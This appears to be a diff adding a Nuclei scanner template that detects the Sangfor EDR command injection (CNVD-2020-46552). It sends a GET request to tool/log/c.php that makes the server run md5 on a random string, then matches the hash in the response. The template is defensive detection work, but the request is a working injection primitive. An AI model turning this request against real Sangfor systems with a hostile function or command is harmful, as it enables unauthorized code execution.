@@ -1,0 +1,31 @@
+id: sangfor-edr-command-injection-cnvd-2020-46552
+info:
+  name: Sangfor EDR Command Injection (CNVD-2020-46552)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects command injection vulnerability in Sangfor EDR via the tool/log/c.php endpoint.
+
+variables:
+  r1: '{{rand_text_alpha(8)}}'
+
+http:
+  - raw:
+      - |
+        GET /tool/log/c.php?strip_slashes=md5&host={{r1}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - text/html
+        part: header
+      - type: regex
+        regex:
+          - '{{md5(r1)}}'
+        part: body
